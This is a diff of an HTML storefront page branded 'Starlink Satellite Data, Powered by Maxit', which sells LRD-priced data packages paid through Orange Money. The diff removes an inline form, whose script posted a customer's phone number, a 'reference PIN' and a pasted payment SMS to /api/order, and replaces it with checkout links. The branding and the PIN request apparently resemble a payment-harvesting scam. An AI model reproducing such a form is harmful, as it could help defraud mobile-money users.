@@ -3,275 +3,60 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Starlink Satellite Data | Powered by Maxit</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Starlink Satellite Data | Maxit</title>
 <style>
 *{box-sizing:border-box}
-body{
- margin:0;
- font-family:Arial,sans-serif;
- background:#edf1f7;
- color:#172238;
-}
-header{
- background:#102b50;
- color:white;
- text-align:center;
- padding:27px 15px;
-}
-header h1{margin:0;font-size:25px}
-header p{margin:9px 0 0;color:#ff9c32;font-weight:bold}
-.container{
- max-width:760px;
- margin:22px auto;
- padding:12px;
-}
-.intro{text-align:center;margin-bottom:22px}
-.packages{
- display:grid;
- grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
- gap:15px;
-}
-.card{
- background:white;
- border-radius:13px;
- padding:22px 16px;
- text-align:center;
- box-shadow:0 3px 12px #00000012;
-}
-.card h2{font-size:19px;margin:5px}
-.price{
- color:#102b50;
- font-size:24px;
- font-weight:bold;
- margin:15px 0;
-}
-button{
- border:0;
- border-radius:7px;
- padding:13px 18px;
- font-size:15px;
- font-weight:bold;
- cursor:pointer;
-}
-.view{
- background:#ff941f;
- color:white;
- width:100%;
-}
-.payment{
- display:none;
- background:white;
- padding:22px;
- border-radius:13px;
- margin-top:22px;
- box-shadow:0 3px 12px #00000012;
-}
-.payment h2{text-align:center}
-.payment label{
- display:block;
- font-weight:bold;
- margin:15px 0 7px;
-}
-.payment input,.payment textarea{
- width:100%;
- padding:13px;
- border:1px solid #ccd3df;
- border-radius:7px;
- font-size:15px;
-}
-.orange{
- background:#ff941f;
- color:white;
- padding:12px;
- text-align:center;
- border-radius:7px;
- font-weight:bold;
-}
-.buy{
- background:#102b50;
- color:white;
- width:100%;
- margin-top:18px;
-}
-.buy:disabled{
- opacity:.6;
- cursor:not-allowed;
-}
-.small{text-align:center;color:#68758a;font-size:13px}
-#status{
- margin-top:15px;
- text-align:center;
- font-weight:bold;
-}
-footer{
- text-align:center;
- padding:25px;
- color:#667085;
-}
+body{margin:0;font-family:Arial;background:#edf1f7;color:#172238}
+header{background:#102b50;color:white;text-align:center;padding:28px 12px}
+header h1{font-size:25px;margin:0}
+header p{color:#ff9c32;font-weight:bold}
+.container{max-width:760px;margin:25px auto;padding:12px}
+.intro{text-align:center;margin-bottom:25px}
+.packages{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:15px}
+.card{background:white;padding:24px 16px;border-radius:13px;text-align:center;box-shadow:0 3px 12px #0001}
+.card h2{font-size:19px}
+.price{font-size:25px;font-weight:bold;color:#102b50;margin:18px}
+.view{display:block;background:#ff941f;color:white;padding:14px;text-decoration:none;border-radius:7px;font-weight:bold}
+footer{text-align:center;padding:25px;color:#667085}
 </style>
 </head>
-
 <body>
-
 <header>
 <h1>STARLINK SATELLITE DATA</h1>
 <p>POWERED BY MAXIT</p>
 </header>
 
 <div class="container">
-
 <div class="intro">
 <h2>Choose Your Data Package</h2>
-<p>Select your preferred package to view details and purchase.</p>
+<p>Select a package and tap View Details to continue.</p>
 </div>
 
 <div class="packages">
-
 <div class="card">
 <h2>5GB</h2>
 <div class="price">LRD 300</div>
-<button class="view" onclick="showDetails('5GB','LRD 300')">VIEW DETAILS</button>
+<a class="view" href="checkout.html?plan=5GB&price=300">VIEW DETAILS</a>
 </div>
 
 <div class="card">
 <h2>Monthly Unlimited</h2>
 <div class="price">LRD 500</div>
-<button class="view" onclick="showDetails('Monthly Unlimited','LRD 500')">VIEW DETAILS</button>
+<a class="view" href="checkout.html?plan=Monthly%20Unlimited&price=500">VIEW DETAILS</a>
 </div>
 
 <div class="card">
 <h2>5G Monthly Unlimited</h2>
 <div class="price">LRD 700</div>
-<button class="view" onclick="showDetails('5G Monthly Unlimited','LRD 700')">VIEW DETAILS</button>
+<a class="view" href="checkout.html?plan=5G%20Monthly%20Unlimited&price=700">VIEW DETAILS</a>
 </div>
-
 </div>
-
-<div class="payment" id="payment">
-<h2>Package Purchase Details</h2>
-
-<p><b>Selected package:</b> <span id="packageName"></span></p>
-<p><b>Package price:</b> <span id="packagePrice"></span></p>
-
-<form id="orderForm">
-
-<label>Customer Phone Number</label>
-<input type="tel" name="phone"
-placeholder="Enter your phone number" required>
-
-<label>Customer Reference PIN Number</label>
-<input type="text" name="pin"
-placeholder="Enter reference PIN" required>
-
-<label>Payment Option</label>
-<div class="orange">ORANGE MONEY</div>
-
-<label>Orange Money Payment SMS / Transaction Link</label>
-<textarea name="payment_sms" rows="4"
-placeholder="Paste your Orange Money payment SMS or transaction link here"
-required></textarea>
-
-<button class="buy" id="buyButton" type="submit">
-BUY NOW
-</button>
-
-</form>
-
-<div id="status"></div>
-
-<p class="small">
-Please confirm your payment details before submitting your order.
-</p>
-</div>
-
 </div>
 
 <footer>
 STARLINK SATELLITE DATA<br>
 Powered by MAXIT
 </footer>
-
-<script>
-let selectedPackage = "";
-let selectedPrice = "";
-
-function showDetails(name,price){
- selectedPackage=name;
- selectedPrice=price;
-
- document.getElementById("packageName").textContent=name;
- document.getElementById("packagePrice").textContent=price;
-
- document.getElementById("payment").style.display="block";
- document.getElementById("status").textContent="";
-
- document.getElementById("payment").scrollIntoView({
-  behavior:"smooth"
- });
-}
-
-document.getElementById("orderForm").addEventListener("submit",async function(e){
-
- e.preventDefault();
-
- const form=this;
- const button=document.getElementById("buyButton");
- const status=document.getElementById("status");
-
- const data=new FormData(form);
-
- const order={
-  customerNumber:data.get("phone").trim(),
-  referencePin:data.get("pin").trim(),
-  smsLink:data.get("payment_sms").trim()
- };
-
- if(!selectedPackage){
-  status.textContent="Please select a package first.";
-  return;
- }
-
- button.disabled=true;
- button.textContent="SENDING ORDER...";
- status.textContent="Submitting your purchase...";
-
- try{
-
-  const response=await fetch("/api/order",{
-   method:"POST",
-   headers:{
-    "Content-Type":"application/json"
-   },
-   body:JSON.stringify(order)
-  });
-
-  const result=await response.json();
-
-  if(!response.ok || !result.success){
-   throw new Error(result.error || "Order could not be sent.");
-  }
-
-  status.style.color="green";
-  status.textContent="Your order has been submitted successfully!";
-
-  form.reset();
-
- }catch(error){
-
-  status.style.color="red";
-  status.textContent="Order not sent. Please try again.";
-
- }finally{
-
-  button.disabled=false;
-  button.textContent="BUY NOW";
-
- }
-
-});
-</script>
-
 </body>
 </html>
